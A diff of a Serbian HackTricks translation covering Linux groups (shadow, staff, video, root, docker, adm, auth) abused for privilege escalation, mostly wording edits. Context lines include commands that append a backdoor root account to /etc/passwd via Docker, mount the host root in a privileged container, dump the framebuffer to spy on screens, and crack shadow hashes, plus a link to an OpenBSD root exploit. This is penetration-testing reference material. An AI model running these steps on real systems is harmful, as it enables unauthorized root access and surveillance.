@@ -8,8 +8,8 @@ Drugi načini podrške HackTricks-u:
 
 * Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
@@ -90,6 +90,8 @@ Korisnici iz **shadow grupe** mogu **čitati** fajl **/etc/shadow**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
+Dakle, pročitajte datoteku i pokušajte **provaliti neke hešove**.
+
 ## Grupa Osoblje
 
 **osoblje**: Omogućava korisnicima da dodaju lokalne modifikacije na sistemu (`/usr/local`) bez potrebe za privilegijama root korisnika (napomena da izvršni fajlovi u `/usr/local/bin` su u PATH varijabli svakog korisnika, i mogu "zameniti" izvršne fajlove u `/bin` i `/usr/bin` sa istim imenom). Uporedite sa grupom "adm", koja je više povezana sa nadgledanjem/bezbednošću. [\[izvor\]](https://wiki.debian.org/SystemGroups)
@@ -104,7 +106,7 @@ $ echo $PATH
 ```
 Ako možemo preuzeti kontrolu nad nekim programima u `/usr/local`, lako možemo dobiti root pristup.
 
-Preuzimanje kontrole nad programom `run-parts` je jedan od načina za lako dobijanje root pristupa, jer će većina programa pokrenuti `run-parts` (kao što su crontab, prilikom SSH prijave).
+Preuzimanje kontrole nad programom `run-parts` je jedan od načina za lako dobijanje root pristupa, jer većina programa pokreće `run-parts` (kao što su crontab, prilikom SSH prijave).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -174,22 +176,22 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 **tty1** znači da je korisnik **yossi fizički prijavljen** na terminal na mašini.
 
-Grupa **video** ima pristup za pregled ekranskog izlaza. U osnovi, možete posmatrati ekrane. Da biste to uradili, treba da **uhvatite trenutnu sliku ekrana** u sirovim podacima i dobijete rezoluciju koju ekran koristi. Podaci ekrana mogu biti sačuvani u `/dev/fb0`, a rezoluciju ovog ekrana možete pronaći na `/sys/class/graphics/fb0/virtual_size`.
+Grupa **video** ima pristup za pregled izlaza ekrana. U osnovi, možete posmatrati ekrane. Da biste to uradili, treba da **uhvatite trenutnu sliku ekrana** u sirovim podacima i dobijete rezoluciju koju ekran koristi. Podaci ekrana mogu biti sačuvani u `/dev/fb0` i možete pronaći rezoluciju ovog ekrana na `/sys/class/graphics/fb0/virtual_size`
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Da biste **otvorili** **sirovu sliku**, možete koristiti **GIMP**, izaberite datoteku \*\*`screen.raw` \*\* i izaberite kao tip datoteke **Podaci o sirovoj slici**:
+Da biste **otvorili** **sirovu sliku**, možete koristiti **GIMP**, izaberite datoteku \*\*`screen.raw` \*\* i izaberite kao tip datoteke **Sirovi podaci slike**:
 
-![](<../../../.gitbook/assets/image (287) (1).png>)
+![](<../../../.gitbook/assets/image (460).png>)
 
 Zatim promenite Širinu i Visinu na one koje su korišćene na ekranu i proverite različite Tipove slika (i izaberite onaj koji najbolje prikazuje ekran):
 
-![](<../../../.gitbook/assets/image (288).png>)
+![](<../../../.gitbook/assets/image (314).png>)
 
 ## Root Grupa
 
-Izgleda da **članovi root grupe** po podrazumevanim postavkama mogu imati pristup **modifikovanju** nekih **konfiguracionih datoteka servisa** ili nekih **biblioteka** ili **drugih interesantnih stvari** koje bi mogle biti korišćene za eskalaciju privilegija...
+Izgleda da **članovi root grupe** po defaultu mogu imati pristup **modifikovanju** nekih **konfiguracionih datoteka servisa** ili nekih **biblioteka** ili **drugih interesantnih stvari** koje se mogu koristiti za eskalaciju privilegija...
 
 **Proverite koje datoteke članovi root grupe mogu modifikovati**:
 ```bash
@@ -197,7 +199,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 ## Docker grupa
 
-Možete **montirati korenski fajl sistem glavne mašine na volumen instance**, tako da kada se instanca pokrene, odmah učitava `chroot` u taj volumen. Ovo vam efektivno daje root pristup mašini.
+Možete **montirati korenski fajl sistem host mašine na volumen instance**, tako da kada se instanca pokrene, odmah učitava `chroot` u taj volumen. Ovo vam efektivno daje root pristup mašini.
 ```bash
 docker image #Get images from the docker service
 
@@ -209,15 +211,15 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-## Pokretanje privilegovanog kontejnera i bekstvo iz njega
+## Zanimljive grupe za Linux eskalaciju privilegija
 
-Ako vam se ne sviđaju prethodni predlozi ili iz nekog razloga ne funkcionišu (npr. docker api firewall?), uvek možete pokušati da **pokrenete privilegovan kontejner i pobegnete iz njega** kako je objašnjeno ovde:
+Konačno, ako vam se ne sviđaju prethodni predlozi ili iz nekog razloga ne funkcionišu (firewall za docker API?), uvek možete pokušati **pokrenuti privilegovan kontejner i izbeći ga** kako je objašnjeno ovde:
 
 {% content-ref url="../docker-security/" %}
 [docker-security](../docker-security/)
 {% endcontent-ref %}
 
-Ako imate dozvole za pisanje nad docker socket-om, pročitajte [**ovaj post o tome kako eskalirati privilegije zloupotrebom docker socketa**](../#writable-docker-socket)**.**
+Ako imate dozvole za pisanje preko docker socket-a, pročitajte [**ovaj post o tome kako eskalirati privilegije zloupotrebom docker socket-a**](../#writable-docker-socket)**.**
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
@@ -231,10 +233,10 @@ Ako imate dozvole za pisanje nad docker socket-om, pročitajte [**ovaj post o to
 
 ## Grupa Adm
 
-Obično **članovi** grupe **`adm`** imaju dozvole za **čitanje log** fajlova koji se nalaze unutar _/var/log/_.\
+Obično **članovi** grupe **`adm`** imaju dozvole za **čitanje log** fajlova smeštenih unutar _/var/log/_.\
 Stoga, ako ste kompromitovali korisnika unutar ove grupe, definitivno treba da **pogledate logove**.
 
 ## Grupa Auth
 
-Unutar OpenBSD-a, grupa **auth** obično može pisati u folderima _**/etc/skey**_ i _**/var/db/yubikey**_ ako se koriste.\
-Ove dozvole mogu biti zloupotrebljene pomoću sledećeg eksploita za **escalaciju privilegija** na root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Unutar OpenBSD-a, grupa **auth** obično može pisati u fascikle _**/etc/skey**_ i _**/var/db/yubikey**_ ako se koriste.\
+Ove dozvole mogu biti zloupotrebljene pomoću sledećeg eksploata za **eskalciju privilegija** do root-a: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
